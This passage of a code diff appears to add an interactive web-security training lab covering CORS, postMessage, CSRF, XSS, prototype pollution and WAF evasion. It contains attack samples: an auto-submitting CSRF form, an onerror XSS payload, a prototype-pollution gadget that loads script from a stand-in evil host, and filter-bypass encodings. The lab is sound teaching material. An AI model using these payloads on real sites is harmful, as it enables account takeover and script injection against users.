+Access-Control-Allow-Origin: https://evil.example
+Access-Control-Allow-Credentials: true</pre>
+<ul>
+<li>ACAC:true forbids ACAO:* — browser hides the body from JS.</li>
+<li>Reflected Origin + credentials = credentialed read from attacker origin.</li>
+<li>Weak regex / contains-check: target.com.attacker.tld</li>
+<li>Origin: null from sandboxed iframe / data: / redirect chain.</li>
+<li>Preflight OPTIONS for non-simple method or Content-Type: application/json.</li>
+</ul></div>
+<div class="lab"><label>attacker Origin / reflected ACAO</label>
+<input id="ori6" type="text" value="https://evil.lab" />
+<select id="acac6"><option value="true">ACAC true</option><option value="false">ACAC false</option></select>
+<div class="row"><button id="sim6" class="primary" type="button">simulate browser decision</button></div>
+<pre id="o6"></pre></div>${markBtn("m6")}`; },
+  m7(){ return `<div class="block"><h3>postMessage API</h3>
+<pre>otherWindow.postMessage(message, targetOrigin);
+window.addEventListener("message", (event) => {
+  if (event.origin !== "https://trusted.example") return;
+  if (event.source !== expectedWindow) return;
+});</pre>
+<ul>
+<li>targetOrigin "*" + secret = any embedder/opener receives it.</li>
+<li>No origin allowlist + innerHTML/eval sink = XSS from attacker origin.</li>
+<li>Substring origin check bypass: trusted.com.attacker.tld</li>
+</ul></div>
+<div class="lab"><p>child listener: box.innerHTML = event.data (no origin check)</p>
+<iframe class="child" id="child7" src="child.html"></iframe>
+<input id="msg7" type="text" value='<img src=x onerror=parent.postMessage("child-sink-hit","*")>' />
+<div class="row"><button id="send7" class="primary" type="button">parent → child.postMessage(payload, "*")</button></div></div>${markBtn("m7")}`; },
+  m8(){ return `<div class="block"><h3>CSRF preconditions</h3>
+<ul>
+<li>state-changing action after login</li>
+<li>session in Cookie (not mandatory Authorization: Bearer header)</li>
+<li>missing / predictable CSRF token</li>
+<li>request stays simple so no preflight</li>
+</ul>
+<pre><form action="https://target.example/change-email" method="POST">
+  <input name="email" value="attacker@evil">
+</form>
+<script>document.forms[0].submit()</script></pre>
+<p>SameSite=Lax still sends cookie on top-level GET. SameSite=Strict first hop blocked; open-redirect on victim origin makes hop 2 same-site. XSS→CSRF: XHR same-origin, read token from DOM, replay POST.</p></div>
+<div class="lab"><div class="quiz">
+<label><input type="radio" name="q8" value="0"> Bearer-only API is exploitable with a classic HTML form</label>
+<label><input type="radio" name="q8" value="1"> Cookie session + SameSite=None ⇒ cross-site form sends the cookie</label>
+<label><input type="radio" name="q8" value="2"> CSRF means reading the victim JSON</label>
+</div>
+<button id="chk8" type="button">check</button>
+<div class="out" id="o8"></div></div>${markBtn("m8")}`; },
+  m9(){ return `<div class="block"><h3>Taxonomy</h3>
+<pre>Reflected  payload in request, echoed in that response. Visible in View-Source.
+Stored     persisted, rendered for another victim.
+DOM-based  client source (hash, history, postMessage) → client sink.
+           View-Source shows pre-JS HTML, not the runtime DOM.
+Blind      no visible output; start with <img src=collab>.
+Self-XSS   only your session; chain with login CSRF.</pre></div>
+<div class="lab"><div class="quiz">
+<label><input type="radio" name="q9" value="0"> GET /search?q= — server prints q into HTML</label>
+<label><input type="radio" name="q9" value="1"> location.hash → innerHTML; backend never sees it</label>
+<label><input type="radio" name="q9" value="2"> comment stored in DB, rendered on other profiles</label>
+</div>
+<button id="chk9" type="button">check</button>
+<div class="out" id="o9"></div></div>${markBtn("m9")}`; },
+  m10(){ return `<div class="block"><h3>Prototype Pollution</h3>
+<pre>function merge(t,s){ for (let k in s) t[k]=s[k]; }
+merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
+({}).admin === true
+
+b.__proto__.transport_url = "https://evil/x.js";
+script.src = config.transport_url;</pre>
+<p>Query gadgets: ?__proto__[admin]=true or constructor[prototype][admin]=true if merge is not prototype-safe.</p></div>
+<div class="block"><h3>WAF evasion</h3>
+<pre>String.fromCharCode(97,108,101,114,116)
+window["alert"](1)
+window[atob("YWxlcnQ=")](1)
+Function\`alert(1)\`
+throw onerror=alert,1
+normalize(NFKD) AFTER waf()  // wrong order</pre>
+<p>Decode / normalize / lowercase BEFORE the filter.</p></div>
+<div class="lab"><div class="row">
+<button id="build10" class="primary" type="button">fromCharCode(97,108,101,114,116)</button>
+<button id="pp10" type="button">pollute Object.prototype.labFlag</button>
+<button id="ppclr" type="button">delete labFlag</button>
+</div>
+<pre id="o10"></pre></div>${markBtn("m10")}`; },
+};
+
+const hooks = {
+  m1(){
+    const out=$("#sink-out"), note=$("#m1-note"), val=()=>$("#src").value;
+    $("#to-text").onclick=()=>{ out.textContent=val(); note.textContent="// textContent → no HTML parse"; };
+    $("#to-html").onclick=()=>{ out.innerHTML=val(); note.textContent="// innerHTML → HTML parser + handlers"; };
+    $("#to-adj").onclick=()=>{ out.textContent=""; out.insertAdjacentHTML("beforeend", val()); note.textContent="// insertAdjacentHTML — same parser"; };
+    $("#to-loc").onclick=()=>{ location.hash=val(); note.textContent="// location.hash = "+location.hash+"\n// Source only; a sink must consume it"; };
+  },
+  m2(){
+    $("#render-ctx").onclick=()=>{
+      const ctx=$("#ctx").value, p=$("#pay").value, o=$("#ctx-out");
+      o.innerHTML="";
+      if(ctx==="href"){ const a=document.createElement("a"); a.href=p; a.textContent="URL sink"; o.append(a); $("#ctx-code").textContent=`<a href="${p}">`+"\nprotocol "+a.protocol; }
+      else if(ctx==="attr"){ o.innerHTML=`<input value="${p}">`; $("#ctx-code").textContent=`<input value="${p}">`; }
+      else if(ctx==="html"){ o.innerHTML=p; $("#ctx-code").textContent="container.innerHTML = payload"; }
+      else { $("#ctx-code").textContent=`var q = "${p}";`; o.textContent="JS string context"; }
+    };
+  },
+  m3(){
+    $("#html3").onclick=()=>{$("#o3").innerHTML=$("#p3").value;};
+    $("#text3").onclick=()=>{$("#o3").textContent=$("#p3").value;};
+    $("#adj3").onclick=()=>{ const o=$("#o3"); o.textContent=""; o.insertAdjacentHTML("beforeend", $("#p3").value); };
+  },
+  m4(){
+    $("#fetch4").onclick=async()=>{
+      try{
+        const r=await fetch("child.html", { credentials:"same-origin" });
+        const t=await r.text();
+        const doc=new DOMParser().parseFromString(t,"text/html");
+        $("#o4").textContent="status "+r.status+"\ncontent-type "+r.headers.get("content-type")+"\ntitle "+doc.title+"\n"+t.slice(0,220);
+      }catch(e){ $("#o4").textContent=String(e); }
+    };
+    $("#xhr4").onclick=()=>{ const xhr=new XMLHttpRequest(); xhr.onload=()=>{$("#o4").textContent="readyState="+xhr.readyState+" status="+xhr.status+"\n"+xhr.responseText.slice(0,220);}; xhr.open("GET","child.html"); xhr.send(); };
+  },
+  m5(){
+    $("#orig").textContent="location.origin = "+location.origin+"\n"+location.href+"\n"+location.protocol+" "+location.hostname+" "+location.port;
+    $("#chk5").onclick=()=>{ const v=document.querySelector("[name=q5]:checked"); $("#o5").innerHTML = v&&v.value==="1" ? '<span class="ok">correct — SOP is a read restriction</span>' : '<span class="bad">wrong — forms still send; path is not origin</span>'; };
+  },
+  m6(){
+    $("#sim6").onclick=()=>{
+      const o=$("#ori6").value.trim(); const acac=$("#acac6").value==="true";
+      const block = o==="*" && acac; const exp = o!=="*" && acac && o.length>0;
+      $("#o6").textContent="HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: "+o+"\nAccess-Control-Allow-Credentials: "+acac+"\n\n{\"email\":\"victim@target\"}\n\nexpose body? "+(block?"NO (* + credentials)":"YES")+"\ncredentialed attacker read? "+(exp?"YES — reflected ACAO + ACAC":"no");
+    };
+  },
+  m7(){ $("#send7").onclick=()=>{$("#child7").contentWindow.postMessage($("#msg7").value, "*");}; },
+  m8(){ $("#chk8").onclick=()=>{ const v=document.querySelector("[name=q8]:checked"); $("#o8").innerHTML = v&&v.value==="1" ? '<span class="ok">correct — CSRF is forced write with browser cookie</span>' : '<span class="bad">Bearer does not ride a simple form. CSRF is not a read.</span>'; }; },
+  m9(){ $("#chk9").onclick=()=>{ const v=document.querySelector("[name=q9]:checked"); $("#o9").innerHTML = v&&v.value==="1" ? '<span class="ok">DOM-based</span>' : '<span class="bad">0 = reflected, 2 = stored</span>'; }; },
+  m10(){
+    $("#build10").onclick=()=>{ const s=String.fromCharCode(97,108,101,114,116); $("#o10").textContent=JSON.stringify(s)+"\nwindow[s]===alert → "+(window[s]===alert)+"\natob YWxlcnQ= → "+atob("YWxlcnQ="); };
+    $("#pp10").onclick=()=>{ Object.prototype.labFlag="polluted"; const o={}; $("#o10").textContent="({}).labFlag === "+JSON.stringify(o.labFlag)+"\nhasOwnProperty labFlag === "+({}).hasOwnProperty("labFlag"); };
+    $("#ppclr").onclick=()=>{ try{ delete Object.prototype.labFlag; }catch(e){} $("#o10").textContent="deleted; ({ }).labFlag === "+({}).labFlag; };
+  },
+};
+
+$("#reset").onclick=()=>{ localStorage.removeItem(KEY); renderHome(); toast("progress cleared"); };
+renderHome();
